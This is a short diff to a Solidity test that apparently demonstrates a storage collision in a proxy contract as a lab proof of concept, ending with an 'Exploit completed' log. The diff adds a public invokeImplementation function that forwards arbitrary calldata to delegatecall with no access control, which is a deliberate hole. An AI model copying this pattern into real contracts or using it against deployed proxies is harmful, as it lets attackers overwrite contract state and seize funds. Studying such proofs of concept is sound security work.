@@ -13,7 +13,8 @@ function testStorageCollision() public {
     ProxyContract = new Proxy(address(LogicContract));
 
     console.log("Current implementation contract address:",ProxyContract.implementation());
-    ProxyContract.testcollision();
+    ProxyContract.invokeImplementation(
+        abi.encodeWithSignature("foo(address)",address(this)));
     console.log("Overwrited slot0 implementation contract address:",ProxyContract.implementation());
     console.log("Exploit completed");
     }
@@ -27,10 +28,8 @@ contract Proxy {
         implementation = _implementation;
     }
 
-    function testcollision() public {
-        implementation.delegatecall(
-            abi.encodeWithSignature("foo(address)",address(this))
-        );
+    function invokeImplementation(bytes memory _calldata) public {
+        implementation.delegatecall(_calldata);
     }
 }
 
